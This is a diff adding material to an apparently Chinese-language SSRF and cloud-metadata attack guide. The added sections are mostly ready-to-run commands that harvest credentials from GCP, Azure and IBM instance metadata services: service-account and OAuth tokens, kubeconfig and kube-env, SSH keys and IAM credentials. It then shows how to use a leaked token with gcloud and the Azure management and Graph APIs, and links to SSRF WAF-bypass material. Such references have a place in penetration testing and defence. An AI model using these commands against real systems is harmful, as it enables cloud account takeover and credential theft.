@@ -458,6 +458,86 @@ http://metadata.google.internal/computeMetadata/v1/instance/id
 http://metadata.google.internal/computeMetadata/v1/project/project-id
 ```
 
+提取有趣端点的信息
+```
+# /project
+# 项目名称及编号
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+# 项目属性
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true
+
+# /oslogin
+# users
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
+# groups
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
+# security-keys
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
+# authorize
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize
+
+# /instance
+# Description
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
+# Hostname
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Image
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
+# Machine Type
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
+# Name
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
+# Tags
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# User data
+curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
+# 网络接口
+for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
+    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
+    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
+    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
+    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
+    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
+    echo "  ==============  "
+done
+# 服务账户
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+# K8s 属性
+## 集群位置
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
+## 集群名称
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
+## Os-login enabled
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
+## Kube-env
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
+## Kube-labels
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
+## Kubeconfig
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig
+
+# 所有自定义项目属性
+curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+
+# 所有自定义项目实例属性
+curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+```
+
 递归拉取
 ```
 http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
@@ -514,6 +594,49 @@ curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCo
 --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
 ```
 
+(2)使用泄露的服务账户令牌
+
+通过环境变量
+```bash
+export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
+gcloud projects list
+```
+
+通过设置
+```bash
+echo "<token>" > /some/path/to/token
+gcloud config set auth/access_token_file /some/path/to/token
+gcloud projects list
+gcloud config unset auth/access_token_file
+```
+
+(3)云功能
+
+```
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+
+# /instance
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# Auto MTLS config
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+```
+
 ### Digital Ocean
 
 ```bash
@@ -544,6 +667,149 @@ http://169.254.169.254/metadata/v1/maintenance
 http://169.254.169.254/metadata/instance?api-version=2017-04-02
 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
 ```
+
+脚本
+
+(1)Bash
+```bash
+HEADER="Metadata:true"
+URL="http://169.254.169.254/metadata"
+API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions
+
+echo "Instance details"
+curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"
+
+echo "Load Balancer details"
+curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"
+
+echo "Management Token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"
+
+echo "Graph token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"
+
+echo "Vault token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"
+
+echo "Storage token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
+```
+
+(2)PowerShell
+```bash
+# Powershell
+Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
+## 用户数据
+$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+
+# 路径
+/metadata/instance?api-version=2017-04-02
+/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+/metadata/instance/compute/userData?api-version=2021-01-01&format=text
+```
+
+---
+
+Azure App
+
+```bash
+# 检查这些环境变量以了解目前是否在Azure app环境中
+echo $IDENTITY_HEADER
+echo $IDENTITY_ENDPOINT
+
+# 检查文件夹
+ls /opt/microsoft
+ls /opt/microsoft/msodbcsql17
+
+# 获取管理令牌
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+# 获取graph令牌
+curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+
+# API
+# 获取订阅
+URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
+curl -H "Authorization: $TOKEN" "$URL"
+# 获取订阅中资源的权限
+URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
+curl -H "Authorization: $TOKEN" "$URL"
+# 获取VM的权限
+URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
+curl -H "Authorization: $TOKEN" "$URL"
+```
+
+```bash
+# PowerShell中向管理端点发送API请求
+$Token = 'eyJ0eX..'
+$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+  'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# 向graph端点发送API请求 (获取企业应用程序)
+$Token = 'eyJ0eX..'
+$URI = 'https://graph.microsoft.com/v1.0/applications'
+$RequestParams = @{
+ Method = 'GET'
+ Uri = $URI
+ Headers = @{
+ 'Authorization' = "Bearer $Token"
+ }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# 使用不带管理令牌和graph令牌的AzureAD PowerShell模块
+$token = 'eyJ0e..'
+$graphaccesstoken = 'eyJ0eX..'
+Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc
+
+# 尝试获取资源的当前权限
+Get-AzResource
+## 以下错误表示用户没有任何资源的权限
+Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
+At line:1 char:1
++ Get-AzResource
++ ~~~~~~~~~~~~~~
+ + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ + FullyQualifiedErrorId :
+Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
+```
+
+### IBM
+
+在IBM中，默认情况下元数据未启用，因此即使位于IBM云VM内，也可能无法访问它
+
+```bash
+export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
+  -H "Metadata-Flavor: ibm"\
+  -H "Accept: application/json"\
+  -d '{
+        "expires_in": 3600
+      }' | jq -r '(.access_token)'`
+
+# 获取实例详细信息
+curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq
+
+# 获取SSH密钥信息
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq
+
+# 获取SSH密钥指纹和用户数据
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq
+
+# 获取归置组
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq
+
+# 获取IAM凭证
+curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
+```
+
+
 
 ### OpenStack/RackSpace
 
@@ -597,3 +863,7 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 ```bash
 curl http://rancher-metadata/<version>/<path>
 ```
+
+## WAF
+
+[SSRF Bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SSRF/waf.md)
